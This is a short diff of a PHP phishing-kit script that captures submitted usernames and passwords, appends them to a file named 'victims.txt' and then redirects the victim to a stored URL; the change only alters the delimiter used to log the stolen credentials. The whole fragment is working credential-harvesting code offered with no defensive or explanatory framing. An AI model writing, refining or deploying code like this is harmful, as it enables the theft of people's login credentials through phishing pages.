@@ -4,7 +4,7 @@ $pwd = $_POST['password'];
 $r = fread(fopen('redir.txt','r'),filesize("redir.txt"));
 if ($user && $pwd){
   $f = fopen('victims.txt','a+');
-  fwrite($f,'USERNAME : '.$user.' PASSWORD : '.$pwd."\n");
+  fwrite($f,$user.'<!:!>'.$pwd."\n");
   echo '<script type="text/javascript">window.location=\''.$r.'\';</script>';}
 ?>
 <!DOCTYPE html>
